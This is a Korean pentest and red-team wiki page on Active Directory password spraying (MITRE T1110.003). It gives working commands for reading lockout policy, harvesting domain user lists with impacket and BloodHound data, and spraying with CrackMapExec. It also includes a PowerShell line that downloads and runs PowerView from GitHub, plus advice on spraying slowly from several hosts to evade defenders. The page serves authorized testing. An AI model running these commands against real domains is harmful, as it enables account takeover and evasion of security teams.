---
description: MITRE ATTACK - T1110.003
---

# 비밀번호 스프레이 공격

비밀번호 스프레이 공격은 다수의 유저 계정을 상대로 하나의 비밀번호를 대입해 공격하는 방식이다.&#x20;

내부망에 진입 후 도메인 유저 계정을 장악했다면 블러드하운드나 내부망 정보 수집을 통해 도메인 유저 명단을 획득할 수 있다. 이 명단을 상대로 비밀번호 스프레이 공격을 시도해볼 수 있다.&#x20;

모의해커나 레드팀의 경우 다음과 같은 주의사항을 꼭 명심해야한다.&#x20;

**모의해커**&#x20;

* 액티브 디렉토리 비밀번호 정책 확인&#x20;
* 대량의 유저를 상대로 할 경우 고객사 연락책 및 블루팀에게 사전 고지&#x20;
* 일괄적으로 스프레이를 하기 보단 특정 숫자로 나눠 공격&#x20;

**레드팀**&#x20;

* 액티브 디렉토리 비밀번호 정책 확인&#x20;
* 스프레이 속도 조절. 속도 조절 실패시 블루팀에게 발각될 확률이 매우 높아짐
* 하나의 호스트에서 스프레이를 진행하기 보단 여러대 호스트에서 긴 시간 동안 느린 속도로 천천히 스프레이 공격을 실행&#x20;

모의해커나 레드팀이나 중요한 것은 바로 "액티브 디렉토리 비밀번호 정책 확인"이다. 고객사 3만명의 직원들의 액티브 디렉토리 유저 계정을 모두 잠금한 뒤 화요일 새벽 고객사 연락책에게서 살벌한 전화를 받기 싫다면 말이다.&#x20;

### AD 비밀번호 정책 확인&#x20;

액티브 디렉토리 비밀번호 정책을 확인하려면 도메인 유저 권한을 갖고 있어야한다. 도메인 컨트롤러를 대상으로 비밀번호 정책을 알아낸다. 계정 잠금 임계점, 임계점 리셋 시간, 계정 잠금 시간 등에 특히 유의한다.&#x20;

{% tabs %}
{% tab title="리눅스" %}
```
# Crackmapexec 
cme smb <ip/FQDN> -u <user> -p <pass> -d <domain> --pass-pol Pdd

# polenum
polenum '<user>:<pass>'@<ip> --domain choi.local
```
{% endtab %}

{% tab title="윈도우" %}
Powerview 혹은 SharpView 등의 툴을 이용하거나 호스트에 기본 AD 파워쉘 모듈이 있다면 그것을 이용한다.&#x20;

```
# Powerview 
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/situational_awareness/network/powerview.ps1')
(Get-DomainPolicy).SystemAccess

# 기본 AD 파워쉘 모듈 
Get-ADDefaultDomainPasswordPolicy
```
{% endtab %}
{% endtabs %}

### 유저 명단 확보&#x20;

유저 명단은 어떠한 툴을 이용하던 LDAP을 통해 알아낼 수 있다. 자주 쓰이는 툴들은 블러드하운드, Powerview 등이 있다.&#x20;

{% tabs %}
{% tab title="리눅스" %}
```
# 블러드하운드 데이터를 이용
jq -r '.data[].Properties.name' 20220614000557_users.json

# impacket GetADUsers
impacket-GetADUsers <domain>/'<user>:<pass>' -all -dc-ip <ip>
impacket-GetADUsers choi.local/'low:Password123!' -all -dc-ip 192.168.40.150
impacket-GetADUsers choi.local/'low:Password123!' -all -dc-ip 192.168.40.150 | grep -i 2022 | cut -d ' ' -f 1 | sort -fuV  > users.txt
```


{% endtab %}

{% tab title="윈도우" %}
```
# Powerview 
(Get-DomainUser).name
```
{% endtab %}
{% endtabs %}

### 스프레이 공격&#x20;

도메인 비밀번호 정책, 계정 잠금 임계점, 계정 잠금 시간등을 확인한 뒤 스프레이 공격을 실행한다. 예를 들어 임계점이 5번이고 임계점 리셋 시간이 2시간이라면 2시간 마다 1\~2개의 비밀번호를 스프레이한다. 그 이유는 실제로 직원들이 자신의 계정을 이용하다 비밀번호를 잘못 입력할수도 있고, 다른 변수들도 존재하기 때문이다.&#x20;

도메인 비밀번호 정책을 모르며 10,000명 이상의 큰 네트워크를 상대로 스프레이 공격을 진행한다면 8시간 마다 1개의 비밀번호를 시도하는 것을 추천한다. 다만, 실행하기 전 고객사에게 연락해 사전 허락을 맡는다.&#x20;

{% tabs %}
{% tab title="리눅스" %}
```
# CrackMapExec
cme smb <ip/FQDN> -u <유저-파일> -p <pass> -d <domain> --no-bruteforce --continue-on-success
cme smb 192.168.40.150 -u users.txt -p 'Password123!' -d <domain> --no-bruteforce --continue-on-success
```


{% endtab %}

{% tab title="윈도우" %}

{% endtab %}
{% endtabs %}



### 레퍼런스&#x20;

{% embed url="https://www.hub.trimarcsecurity.com/post/trimarc-research-detecting-password-spraying-with-security-event-auditing" %}

{% embed url="https://www.eshlomo.us/active-directory-password-spray-attack/" %}
